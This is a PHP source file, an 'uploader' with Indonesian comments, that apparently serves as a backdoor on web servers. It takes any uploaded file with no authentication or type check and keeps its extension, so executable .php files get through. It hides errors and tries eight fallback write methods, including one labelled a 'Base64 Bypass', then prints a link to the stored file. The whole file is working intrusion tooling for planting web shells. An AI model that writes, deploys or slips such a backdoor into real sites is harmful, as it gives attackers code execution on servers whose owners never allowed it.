<?php
/**
 * ZEDD MULTI-ENGINE UPLOADER - RANDOM NAME EDITION
 */
error_reporting(0);
set_time_limit(0);

if (isset($_FILES['file_data'])) {
    $f = $_FILES['file_data'];
    $t = $f['tmp_name'];
    
    // GENERATE NAMA RANDOM (8 Karakter + Ekstensi Asli)
    $ext = pathinfo($f['name'], PATHINFO_EXTENSION);
    $n = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 8) . '.' . $ext;
    
    $done = false;

    // METODE 1: Stream Copy
    if (!$done && function_exists('stream_copy_to_stream')) {
        $s = @fopen($t, 'rb'); $d = @fopen($n, 'wb');
        if ($s && $d) { $done = @stream_copy_to_stream($s, $d); fclose($s); fclose($d); }
    }

    // METODE 2: Binary Chunk (Anti 0kb)
    if (!$done) {
        $s = @fopen($t, 'rb'); $d = @fopen($n, 'wb');
        if ($s && $d) {
            while (!feof($s)) { @fwrite($d, fread($s, 8192)); }
            fclose($s); fclose($d);
            $done = (file_exists($n) && filesize($n) > 0);
        }
    }

    // METODE 3: File Put Contents
    if (!$done && function_exists('file_get_contents')) {
        $c = @file_get_contents($t);
        if ($c !== false) { $done = @file_put_contents($n, $c); }
    }

    // METODE 4: Base64 Bypass
    if (!$done) {
        $c = @file_get_contents($t);
        if ($c) { $done = @file_put_contents($n, base64_decode(base64_encode($c))); }
    }

    // METODE 5: cURL Local
    if (!$done && function_exists('curl_init')) {
        $ch = @curl_init('file://' . $t);
        $fp = @fopen($n, 'wb');
        if ($ch && $fp) {
            curl_setopt($ch, CURLOPT_FILE, $fp);
            $done = @curl_exec($ch);
            curl_close($ch); fclose($fp);
        }
    }

    // METODE 6, 7, 8: System Fallback
    if (!$done) { $done = @rename($t, $n); }
    if (!$done) { $done = @move_uploaded_file($t, $n); }
    if (!$done) { $done = @copy($t, $n); }

    // VERIFIKASI & OUTPUT
    if ($done && file_exists($n) && filesize($n) > 0) {
        $link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/" . $n;
        echo "---OK: <a href='$link' target='_blank'>$n</a>---";
    } else {
        echo "---FAILED---";
    }
}
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file_data">
    <input type="submit" value="Upload & Randomize">
</form>